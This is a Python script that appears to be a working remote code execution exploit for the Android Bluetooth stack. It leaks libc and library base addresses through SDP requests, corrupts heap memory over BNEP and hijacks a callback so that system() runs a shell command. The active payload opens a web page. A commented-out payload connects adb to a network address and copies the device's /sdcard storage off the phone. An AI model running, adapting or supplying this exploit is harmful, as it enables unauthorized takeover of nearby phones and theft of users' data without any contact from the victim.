#!/usr/bin/python

import os
import sys
import time
import struct
import select
import binascii
import subprocess

import bluetooth
from bluetooth import _bluetooth as bt

from pwn import *

# Payload
#SHELL_SCRIPT = 'adb connect 192.168.1.42&&adb push /sdcard /tmp/sdcard/'
SHELL_SCRIPT = 'am start -a android.intent.action.VIEW -d "https://ex-sploit3r.blogspot.fr/"'

LEAK_LIB_BLUETOOTH_OFFSET = 0x34
LEAK_LIB_LIBC_OFFSET =0x124

OFFSET_LIBC_LEAK_WITH_BASE = 0x12000
OFFSET_BLUETOOTH_LEAK_WITH_BASE = 0xf4000

OSTASKFIRST_OFFSET = 0x118 + 4 # Offset of OSTaskFrist in gki_cb structure


PWNING_TIMEOUT = 3
BNEP_PSM = 15
LEAK_ATTEMPTS = 5

LIB_BLUETOOTH = "bluetooth.default.so"
LIB_LIBC = "libc.so"


def memory_leak_get_bases(src_hci, dst):
    service_long = 0x0100
    service_short = 0x0001
    mtu = 50
    n = 40

    def packet(service, continuation_state):
        pkt = '\x02\x00\x00'
        pkt += p16(7 + len(continuation_state))
        pkt += '\x35\x03\x19'
        pkt += p16(service)
        pkt += '\x01\x00'
        pkt += continuation_state
        return pkt

    p = log.progress('Exploit')
    p.status('Creating L2CAP socket')

    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    context.endian = 'big'

    p.status('Connecting to target')
    sock.connect((dst, 1))

    p.status('Sending packet 0')
    sock.send(packet(service_long, '\x00'))
    data = sock.recv(mtu)

    if data[-3] != '\x02':
        log.error('Invalid continuation state received.')

    leak = ''

    for i in range(1, n):
        p.status('Sending packet %d' % i)
        sock.send(packet(service_short, data[-3:]))
        data = sock.recv(mtu)
        leak += data[9:-3]

    sock.close()

    log.info(hexdump(leak[0:0x200]))

    bluetooth_stack_offset = LEAK_LIB_BLUETOOTH_OFFSET
    libc_stack_offset = LEAK_LIB_LIBC_OFFSET

    libc_leak_address = struct.unpack(">I", leak[libc_stack_offset:libc_stack_offset+0x4])[0]
    bluetooth_default_leak_address = struct.unpack(">I", leak[bluetooth_stack_offset:bluetooth_stack_offset+4])[0]


    log.info("libc_leak_address %X" % libc_leak_address)
    log.info("bluetooth_default_leak_address %X" % bluetooth_default_leak_address)

    libc_text_base = (libc_leak_address&0xFFFFF000) - OFFSET_LIBC_LEAK_WITH_BASE
    bluetooth_default_bss_base = (bluetooth_default_leak_address&0xFFFFF000) - OFFSET_BLUETOOTH_LEAK_WITH_BASE

    log.info('libc_base: 0x%08x, bluetooth_default_base: 0x%08x' % (libc_text_base, bluetooth_default_bss_base))


    return libc_text_base, bluetooth_default_bss_base


def write_data(bnep, addr, data):

    dst_addr = addr
    log.info("Destination address : 0x%08x"%dst_addr)
    log.info("Data to write : %s (%d)" % (data.encode("hex"),len(data)))

    dst_addr = struct.pack('<I', dst_addr)

    pad_len=0
    if len(data)<=0x40:
        pad_len = 0x41 - len(data)
    elif len(data) >=0x120:
        log.error("Data len too big ! ")

    prog = log.progress('Writing data...(padding size = %d)' % pad_len)
    # First override next chunk
    p = ('810100' + "42"*(0x120-4)).decode("hex")+dst_addr
    bnep.send(p)

    # Then allocate the next chunk

    # Hdr of chunk : 0x00000000  0x00010000  0x00410000  0x00000000
    pay = data + cyclic(pad_len)
    real = "00000000000100000041000000000000" + pay.encode("hex")
    log.info("Real data written : %s" % real)

    # Write data to dst_addr
    bnep.send('\x81\x01\x00'+ pay)
    prog.success()


class Exploit():

    def __init__(self, src_hci, dst, lib_path):
        self.src_hci = src_hci
        self.dst = dst
        self.lib_path = lib_path
        self.offset_system = None
        self.offset_btu_cb = None
        self.offset_gki_cb = None
        self.lib_path = lib_path

        log.info("Extract symbols from libs")
        self.extract_offsets_from_libs()


    def extract_offsets_from_libs(self):
        bluetooth_lib = os.path.join(self.lib_path, LIB_BLUETOOTH)
        libc_lib = os.path.join(self.lib_path, LIB_LIBC)

        if not os.path.exists(bluetooth_lib):
            raise Exception("bluetooth.default.so not found !")

        if not os.path.exists(libc_lib):
            raise Exception("libc.so not found !")

        # Get system offset
        out = subprocess.Popen("nm -D %s | grep ' %s' "%(libc_lib,"system"),
                                shell=True, stdout=subprocess.PIPE).stdout.read()

        self.offset_system = int(out.split()[0],16)

        # Get btu_cb offset
        out = subprocess.Popen("nm -D %s | grep ' %s' "% (bluetooth_lib, "btu_cb"),
                                shell=True, stdout=subprocess.PIPE).stdout.read()
        self.offset_btu_cb = int(out.split()[0],16)

        # Get gki_cb offset
        out = subprocess.Popen("nm -D %s | grep ' %s' "% (bluetooth_lib, "gki_cb"),
                                shell=True, stdout=subprocess.PIPE).stdout.read()
        self.offset_gki_cb = int(out.split()[0],16)

        self.offset_gki_cb_ostaskfirst = self.offset_gki_cb + OSTASKFIRST_OFFSET

        log.info("Offset system : 0x%x", self.offset_system)
        log.info("Offset btu_cb : 0x%x", self.offset_btu_cb)
        log.info("Offset gki_cb : 0x%x", self.offset_gki_cb)
        log.info("Offset offset_gki_cb_ostaskfirst : 0x%x", self.offset_gki_cb_ostaskfirst)
    

    def pwn(self, bluetooth_default_bss_base, libc_text_base):

        prog = log.progress('Connecting to BNEP again')

        bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        bnep.bind((self.src_hci, 0))
        bnep.connect((self.dst, BNEP_PSM))
        prog.success()


        btu_cb = self.offset_btu_cb + bluetooth_default_bss_base

        gki_cb_ostaskfirst = self.offset_gki_cb_ostaskfirst + bluetooth_default_bss_base

        system = libc_text_base + self.offset_system
        #system = 0xFFFFFFFF

        # Store the message to add in the mailbox
        exploit =""
        exploit += "\x00\x00\x00\x00" # p_next
        exploit += "\x00" # q_id
        exploit += "\x00" # task_id
        exploit += "\x00" # status
        exploit += "\x00" # type
        exploit += struct.pack("<H", 0xBEBE) #event
        exploit += struct.pack("<H", 0x2222) # len
        exploit += struct.pack("<H", 0x1111) # offset
        exploit += struct.pack("<H", 0x1111) # layter_specific
        exploit += ";"+SHELL_SCRIPT
        exploit += "\x00"*(0x40-len(exploit))

        callback =""
        # Overrite the event_reg field to register a callback to 'system'
        callback +=struct.pack("<H", 0xBE00) #event
        callback +=struct.pack("<H", 0x0) #event (padding)
        callback +=struct.pack("<I", system) #callback

        pay = exploit + callback
        pay_addr = btu_cb+(8*2) - (len(pay)-len(callback)) # btu_cb + sizeof(timer_reg[BTU_MAX_REG_TIMER])
        mbox_exploit_addr = pay_addr

        #mbox_exploit_addr = 0xFFFFFFFF

        # Then insert a new message in the mbox queue
        pay2 = ""
        pay2 = struct.pack("<I", mbox_exploit_addr) + "\x00\x00\x00\x00"*(3*4 -1) # OSTaskQFirst[3] (only first is used)
        pay2 += "\x00\x00\x00\x00"*(3*4) #  OSTaskQLast[3] (not used)
        pay2 += "\x00"*(10*16)

        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)

        if writeable:

            write_data(bnep,pay_addr-0x10, pay)

            for i in xrange(2):
                bnep.send(binascii.unhexlify('8109' + '800109' * 100))
                time.sleep(2)
                write_data(bnep,gki_cb_ostaskfirst-0x10, pay2)

        bnep.close()

    def run(self):

        os.system('hciconfig %s sspmode 0' % (self.src_hci,))
        os.system('hcitool dc %s' % (self.dst,))

        # Try to leak section bases
        for j in range(LEAK_ATTEMPTS):
            libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(self.src_hci, self.dst)
            if (libc_text_base & 0xfff == 0) and (bluetooth_default_bss_base & 0xfff == 0):
                break
        else:
           assert False, "Memory doesn't seem to have leaked as expected. Wrong .so versions?"

        self.pwn(bluetooth_default_bss_base, libc_text_base)


def main(src_hci, dst, path):
    exploit = Exploit(src_hci, dst, path)
    exploit.run()

if __name__ == '__main__':
    main(*sys.argv[1:])
